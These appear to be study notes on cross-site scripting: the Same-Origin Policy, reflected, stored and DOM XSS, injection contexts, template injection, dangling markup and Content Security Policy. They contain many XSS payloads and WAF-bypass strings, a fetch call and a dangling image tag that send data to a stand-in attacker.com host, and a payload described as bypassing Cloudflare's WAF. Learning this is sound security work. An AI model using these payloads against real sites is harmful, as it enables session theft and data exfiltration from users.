Same-Origin Policy :
The Same-Origin Policy (SOP) is a security rule enforced by browsers. It stops websites from accessing data from each other unless they share the same origin.
Origin = Protocol + Domain + Port

For example:
https://example.com:443 ≠ http://example.com:80
https://example.com ≠ https://evil.com
Only if all 3 match, they are considered the same origin.

SOP **prevents a malicious origin from _reading**_** data from another origin.**

Here’s what SOP **blocks**:

- A page from `evil.com` trying to **read** a response from `bank.com`
- A script from `attacker.com` trying to **access cookies, DOM, or response data** from `victim.com`

But SOP **does NOT block a site from sending requests** to another origin!

Requests Are Allowed — Responses Are Protected
- The browser sends the request ✅
- But the script never **needs to read** a response—it just sends data off (like a message in a bottle 📦)
- SOP **doesn’t stop sending data to other origins**, it just **blocks reading** from them


- **Stored XSS**: Malicious script is saved in the database and shown to all users (like a poisoned comment).
- **Reflected XSS**: Script is injected into a URL or form and reflected back immediately.
- **DOM-based XSS**: Vulnerability exists entirely in client-side code, often due to JavaScript mishandling.


##### How to Find and Test Reflected XSS Vulnerabilities

✅ Step 1: Test Every Input Entry Point
- URL query parameters: `?search=abc`
- POST bodies: form fields like `comment=hi`
- URL path: `/product/abc123`
- Headers: `User-Agent`, `Referer`, `X-Forwarded-For`

✅ Step 2: Inject a Unique Random Token
Use a token like:

```

xyzABC12

```

Put it into:

```

https://target.com/page?search=xyzABC12

```

Then search the response for that string.

📌 If you find it in the response, it tells you:

> “Aha! The input is reflected somewhere in the page!”

| Location | Example | Context |
| --- | --- | --- |
| In raw HTML | `<p>You searched: xyzABC12</p>` | ✅ Safe to test with HTML tag payload |
| Inside attribute | `<input value="xyzABC12">` | 🟡 Needs quote handling |
| Inside JS | `var user = "xyzABC12";` | 🔴 Dangerous! JS context needs JS escaping |
### Step 4: **Test a Basic Payload**

Try something simple first:

```html
html
CopyEdit
<script>alert(1)</script>

```

If it runs, congrats 🎉 you found reflected XSS.

You can also try payloads like:

```html
html
CopyEdit
"><script>alert(1)</script>

```

Or even inside JS:

```
js
CopyEdit
";alert(1);//

```

> 🧪 Tools: Use Burp Repeater to test requests, or manually craft URLs
> 

---

### ✅ Step 5: **Test Alternative Payloads**

Sometimes the app:

- **Filters characters** like `<` or `"`
- **Escapes some but not all input**
- **Strips known patterns** like `script`

So you test **obfuscated payloads**:

```jsx
<img src=x onerror=alert(1)>
```

```jsx
<script>eval('alert(1)')</script>
```

And encoded versions:

```jsx
<script>alert(String.fromCharCode(88,83,83))</script>
```

Burp Intruder + Burp Scanner can help fuzz many payloads automatically.

### ✅ Step 6: Confirm in a Real Browser

Even if it looks like the payload works in Burp:

Try the exact link in Chrome or Firefox

Look for alert(document.domain) (safe demo)

Make sure JavaScript actually executes, not just appears in source

| Type | What It Means | Persistence | Delivery Method |
| --- | --- | --- | --- |
| **Reflected XSS** | Input is immediately echoed back | ❌ Temporary | Link/URL-based |
| **Stored XSS** | Malicious input is stored (DB, file) | ✅ Persistent | Comments, posts, etc. |
| **Self-XSS** | Victim tricks themselves into running malicious code | ❌ Local only | Social engineering (paste in console) |
### Self-XSS = Low Impact

- The script only runs **if the user pastes it into their browser console**
- No remote execution
- Often used in **phishing tricks** like:
    
    > “Paste this to get free followers!”

# What Is Stored XSS?

> Stored XSS occurs when malicious input is:
> 
1. **Submitted by the attacker** (e.g., via form, API, or request)
2. **Saved by the server** (in a database, file, or backend storage)
3. **Later rendered** into a page viewed by **other users**, **unescaped**

Unlike **reflected XSS**, which lives only in the request, **stored XSS stays in the app** and can hit **multiple victims** — that's why it's **persisten**

| Example | Where Data May Appear |
| --- | --- |
| Blog comments | Public blog page |
| User profile name | Profile pages, post author tags, chat, admin dashboards |
| Email subject | Webmail inbox |
| Uploaded file name | Download section |
| Search history | Sidebar, autocomplete suggestions |
| Logs or audit pages | Admin-only views |

| Feature | Reflected XSS | Stored XSS |
| --- | --- | --- |
| Persistence | ❌ Temporary (in request) | ✅ Persistent (in database or backend) |
| Delivery Required | ✅ Yes – needs crafted link | ❌ No – user stumbles into it |
| Timing critical? | ✅ Yes – victim must be logged in *when clicking* | ❌ No – attack waits for victim |
| Works on all users? | ❌ Only if they click attacker's link | ✅ Yes, all users who load the data |
| Ideal for phishing, mass theft | ❌ Harder to scale | ✅ Easy to mass exploit |
🛠 Impact: What the Attacker Can Do
- **Session Hijacking**: Steal cookies and log in as victim
- 📬 **CSRF Automation**: Auto-submit forms, change emails/passwords
- 💳 **Perform Transactions**: Buy items, send messages, delete accounts
- 👁️ **Spy on Activity**: Log keystrokes, intercept inputs
- 🎣 **Phishing UI**: Replace parts of the page with fake forms
- 📦 **Drop Malware**: Inject malicious iframes or JS payloads



What is DOM XSS ?

> DOM-based XSS happens when JavaScript running in the browser:
> 
- Takes **user-controllable input** (like the URL)
- And inserts it **directly into the page** (into the DOM)
- **Without sanitizing or escaping it**

The JavaScript reads from location.search (the query string), and writes directly into .innerHTML — a classic source-to-sink path.

| Step | What Happens |
| --- | --- |
| 1. Input (source) | Attacker controls part of the URL: `?msg=...` |
| 2. JavaScript reads it | JS uses `location.search`, `location.hash`, etc. |
| 3. Data reaches a sink | Dangerous function like `.innerHTML`, `eval()` |
| 4. Execution | The browser executes the malicious code |
### Common **Sources** (where attacker input comes from):

- `location.search` (URL parameters)
- `location.hash` (after `#`)
- `document.referrer`
- `document.cookie`
- `localStorage`, `sessionStorage`

### 💥 Common **Sinks** (where dangerous execution happens):

- `innerHTML`
- `document.write()`
- `eval()`, `Function()`
- `setTimeout("string")`
- `location.href = userInput`
- `src`, `href`, `onload` attributes

| Feature | Reflected XSS | Stored XSS | DOM-based XSS |
| --- | --- | --- | --- |
| Happens where? | Server echoes request | Server stores + displays | In browser JavaScript |
| Needs server response? | ✅ Yes | ✅ Yes (later) | ❌ No |
| Found in source view? | ✅ Usually | ✅ Usually | ❌ No (use DevTools) |
| Exploited by? | Crafted link | Comment/post/profile | Bad JS handling |

| Principle | Why It Matters |
| --- | --- |
| `document.write()` is dangerous | It parses raw HTML directly into the page |
| `location.search` is attacker-controlled | Anything in the URL can be manipulated |
| Building HTML with unescaped input = 💣 | Allows attackers to inject scripts |
| Safer APIs exist | Use `createElement`, `textContent`, and `appendChild` |

DOM-based XSS via third-party libraries, specifically jQuery, which is a common real-world attack surface — especially when developers unknowingly pass attacker-controlled data into functions like .attr(), .html(), or .append().

| Step | Description |
| --- | --- |
| 🟡 Input Source | Attacker input in the **URL or form field** |
| 🟠 Server-side | Reflects the value into the HTML page |
| 🔵 DOM Access | Client-side JavaScript reads the value (e.g., from `innerHTML`, `value`, etc.) |
| 🔴 Sink | JavaScript executes or inserts the input into a **dangerous function**, like `eval`, `innerHTML`, `setTimeout`, etc. |
| 💥 XSS | Script executes in the victim's browser |

#### Testing in different XSS Context :

Context #1: Between HTML Tags (Text Content)
```bash
<p>Hello, [user input here]</p>
```

Payload	What It Does

| Payload | What It Does |
| --- | --- |
| `<script>alert(1)</script>` | Classic script injection |
| `<img src=x onerror=alert(1)>` | Self-closing tag with JS in attribute |
| `<svg onload=alert(1)>` | SVG tag with JS event |
| `<iframe src="javascript:alert(1)">` | Executes JS on load (browser-dependent) |
| `<math href="javascript:alert(1)">` | Obscure tag bypass |


| Trait | Explanation |
| --- | --- |
| ✅ Easy to exploit | Just inject a tag like `<script>` or `<img>` |
| 🔐 Escaping needed | Use `htmlspecialchars()` or output encoding |
| 🧪 Payload tip | Start with `<img src=x onerror=alert(1)>` — runs without user click |




Context #2 What is the “HTML Attribute Context”?

```bash
<input value="[INPUT]">
" autofocus onfocus=alert(1) x="
<input value="" autofocus onfocus=alert(1) x="">
" onclick=alert(1) x="

" autofocus onfocus=alert(1) x="
" onmouseover=alert(1) x="
" onpointerenter=alert(1) x="
" onanimationstart=alert(1) style=animation-name:foo x="
```


| Challenge | Workaround |
| --- | --- |
| Angle brackets (`<`, `>`) blocked | Don't inject new tags — use attributes only |
| Quotes escaped (`"`) | Use single quotes `'` or break early with unquoted attributes |
| WAF blocks `onerror`, `onload` | Use `onfocus`, `onpointerenter`, `ontoggle`, etc. |

Context #3 What is accesskey in HTML?

```bash
<link rel="canonical" href="[USER INPUT]">
" accesskey=x onfocus=alert(1) x="
<link rel="canonical" href="" accesskey="x" onfocus=alert(1) x="">
<input type="hidden" name="token" value="[USER INPUT]">

```



| Filter Blocks | Why This Still Works |
| --- | --- |
| `<script>` tags | No script tag used |
| Angle brackets | You don’t need new tags |
| Dangerous tags | `<link>`, `<input>` are allowed |
| Common attributes (`onerror`) | You're using **less common** ones: `onfocus`, `accesskey` |

Context #4 , inside Javascript context xss , HTML Parses First, JS Parses Later
- It identifies tags: `<html>`, `<head>`, `<body>`, `<script>`, etc.
- When it encounters a `<script>` tag, it says:
    
    > “Oh, this is JavaScript — I’ll let the JS parser handle this content.”
    > 

---

### 🔹 **2. JavaScript Parsing Stage**:

Now the JS inside `<script>` gets handed over to the **JavaScript engine**:

- It parses and executes the JavaScript **inside the `<script>` block only**
- It does **not care** about HTML anymore
- If the JavaScript has syntax errors, it might throw — but sometimes **broken JS doesn’t matter** if **another tag already got parsed**

| What You Inject | Why It Works |
| --- | --- |
| `</script><img src=x onerror=alert(1)>` | HTML parser closes script early → parser resumes on your HTML payload |
| `';alert(1);//` | Breaks out of JS string → adds your code |
| `';</script><img src=x onerror=alert(1)>` | Breaks string **and** escapes tag context |
> HTML parser decides what’s code, and what’s content.
> > 
> If you can trick it into **closing a script early** or **inserting HTML**, you can trigger **XSS even with broken JavaScript**.


| Part | Purpose |
| --- | --- |
| `'` | Ends the current JS string |
| `;alert(document.domain)` | Your injected JS |
| `//` | Comments out the remaining `'` or code that follows |


| Payload | Use Case |
| --- | --- |
| `';alert(1)//` | JS string (single-quoted) |
| `";alert(1)//` | JS string (double-quoted) |
| `');alert(1)//` | Inside a JS function call |
| `'`;fetch('//attacker.com')//` | JS exfiltration |
| `'`;eval('alert(1)')//` | If `eval()` is safe context |


Sub context : Backslash-escaping vulnerability in JavaScript string context

```bash

var input = 'abc';    // ✅ normal string
var input = 'ab\'c';  // ✅ includes a literal `'`
var input = 'ab\\'c'; // ❌ invalid unless escaped properly
```


| Character | Meaning |  |
| --- | --- | --- |
| `\\` | First backslash escapes the second = literal `\` |  |
| `'` | Now this quote is **no longer escaped!** → closes the string |  |
| `;alert(1)` | ✅ Now part of actual JS code |  |
| `//` | Comments out the rest |  |
| `'` | Ignored — it’s commented |  |
|  |  |  |

- ✅ JS string: `'\\'` = OK
- ✅ Then: `;alert(document.domain)` runs
- ✅ `//';` is just a comment — won’t break the script

 JavaScript Template Literals?
 
 Template literals use backticks (`) instead of quotes (' or "), and allow embedded JavaScript expressions via ${...}:
 ```bash
 const name = "Alice";
console.log(`Hello, ${name}`); // → Hello, Alice
 ```

| Traditional XSS | Template Literal XSS |
| --- | --- |
| Needs `</script>` or string break | ✅ Doesn't need to terminate the string |
| Often blocked by quote filtering | ✅ No quotes used at all |
| Uses `<img onerror=...>` or `script` tags | ✅ Just uses JS expressions inline |


FOR CSTI:

| Behavior                                     | Indicator                       |
| -------------------------------------------- | ------------------------------- |
| Input reflected into DOM as `{{something}}`  | AngularJS or Handlebars present |
| You see `Hello {{user}}` in source           | Template binding                |
| You input `{{7*7}}` and see `49`             | Evaluation confirmed            |
| Page loads AngularJS (e.g. via `angular.js`) | Target identified               |

```bash
{{constructor.constructor('alert(1)')()}}
```


Dangling Markup Injection:
```bash
<input type="text" value="CONTROLLABLE DATA HERE">
<input type="text" value=""><img src='//attacker.com?REST-OF-THE-PAGE

```


1. `<img src='//attacker.com? ...>` begins making a request
2. The browser reads *forward through the HTML* until it finds the **next `'` (single quote)**
3. Everything in between — **including the rest of the HTML** — becomes part of the **image request URL**
4. This means a chunk of the HTML page is sent to the attacker's server — as part of the request to load the image

| Barrier | Bypassed? | Why |
| --- | --- | --- |
| CSP | ✅ | No inline script |
| `script` filters | ✅ | Uses `img` or similar |
| HttpOnly | ✅ | Doesn’t touch cookies |
| DOM sandboxing | ✅ | No JS context needed |
| Filtered `onerror` | ✅ | Doesn’t use event handlers |

| Tag | Attribute |
| --- | --- |
| `<img>` | `src` |
| `<iframe>` | `src` |
| `<link>` | `href` |
| `<script>` | `src` |
| `<video>` | `poster`, `src` |
| `<audio>` | `src` |
| `<form>` | `action` (if auto-submitted) |


Content Security Policy (CSP):


**Content Security Policy** (CSP) is a feature that helps to prevent or minimize the risk of certain types of security threats. It consists of a series of instructions from a website to a browser.

The primary use case for CSP is to control which resources, in  particular JavaScript resources, a document is allowed to load. This is  mainly used as a defense against [cross-site scripting](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting) (XSS) attacks, in which an attacker is able to inject malicious code into the victim's site.

A CSP can have other purposes as well, including defending against [clickjacking](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Clickjacking) and helping to ensure that a site's pages will be loaded over HTTPS.

- The policy is specified as a series of *directives*, separated by semi-colons.
- Each directive controls a different aspect of the security policy.
- Each directive has a name, followed by a space, followed by a  value

`Content-Security-Policy: default-src 'self'; img-src 'self' example.com`

It sets two directives:

- the `default-src` directive is set to `'self'`
- the `img-src` directive is set to `'self' example.com`

The first directive, `default-src`, tells the browser to load only resources that are same-origin with the document, unless other  more specific directives set a different policy for other resource  types. The second, `img-src`, tells the browser to load images that are same-origin or that are served from `example.com`.

Fetch directives are used to specify a particular category of  resource that a document is allowed to load — such as JavaScript, CSS  stylesheets, images, fonts, and so on.

There are different fetch directives for different types of resource. For example:

- [`script-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src) sets allowed sources for JavaScript.
- [`style-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/style-src) sets allowed sources for CSS stylesheets.
- [`img-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/img-src) sets allowed sources for images.

One special fetch directive is `default-src`, which sets a fallback policy for all resources whose directives are not explicitly listed.

- `default-src` is given the single source expression `'self'`
- `img-src` is given two source expressions: `'self'` and `example.com`

- images must be either same-origin with the document, or loaded from `example.com`
- all other resources must be same-origin with the document.

You can allow inline JavaScript by using:
```bash
Content-Security-Policy: script-src 'self' 'unsafe-inline';
```

Content-Security-Policy: script-src 'self' 'nonce-abc123';


🔧 unsafe-inline Is Ignored if nonce or hash Is Present
```bash
script-src 'self' 'nonce-abc123' 'unsafe-inline';

```

>Browsers ignore unsafe-inline.
Only the nonce-based scripts run.
>
Content-Security-Policy: script-src 'self' 'unsafe-eval';


| Feature | Blocked by CSP? | Can be allowed by? | Should you allow? |
| --- | --- | --- | --- |
| Inline `<script>` | ✅ Yes | `'unsafe-inline'` or nonce/hash | ❌ |
| `onerror`, `onclick`, etc. | ✅ Yes | `'unsafe-inline'` | ❌ |
| `javascript:` URLs | ✅ Yes | `'unsafe-inline'` | ❌ |
| `eval()` / `Function()` | ✅ Yes | `'unsafe-eval'` | ❌ |
| setTimeout("...") | ✅ Yes | `'unsafe-eval'` | ❌ |



✅ If the content of the script exactly matches a known hash value, the browser will allow it to execute.

Developers should avoid 'unsafe-inline', because it defeatsmuch of the purpose of having a CSP. Inline JavaScript is one of the  most common XSS vectors, and one of the most basic goals of a CSP is to  prevent its uncontrolled use.


#### LIst of techniques  and payload:

<input/onmouseover="javaSCRIPT:confirm(1)”

Awesome payload where we used any tag inside svg tag especially animate tag where we set any attribute to parent tag here is <a> , from below payload  <a href=javascript:alert(1)> look like this. this is used to bypass where all event handlers are blocked or tags. 

<svg><a><animate+attributeName=href+values=javascript:alert(1)+/><text+x=20+y=20>Click me</text></a>


bypass XSS Cloudflare WAF

Encoded Payload:

"><track/onerror='confirm\%601\%60'>

Clean Payload:

"><track/onerror='confirm1'>

HTML entity & URL encoding:

" --> "

> --> >
< --> <
' --> '
` --> \%60
> 

#Bypass #XSS #WAF

<input type="checkbox" id="z" value="xss0r" style="display:none" &%2362;="" onchange="top[['alert'][0]](https://www.notion.so/location.hostname);this.remove()"><label for="z" style="position:fixed;inset:0;cursor:crosshair"></label>

&%2362; is a double-encoded HTML entity that resolves to >

This bypasses WAFs that decode only once (seeing > instead of >)

Original: > → > → renders as closing angle bracket

Uses onchange which is less monitored than onclick

Triggers when checkbox state changes (via label click)

top[['alert'][0]] is equivalent to top['alert']

Uses array dereferencing ([0]) to hide "alert”

Bypasses simple regex checks for window.alert

Uses location.hostname instead of document.domain

Alternate property access avoids keyword detection

display:none makes checkbox invisible
position:fixed;inset:0 makes label cover entire viewport
cursor:crosshair provides visual cue (optional)
this.remove() cleans up after execution

No direct .alert() calls
No quote-based string concatenation
Uses array indexing for function name
Double-encoded HTML entities
Indirect property access (location vs document)


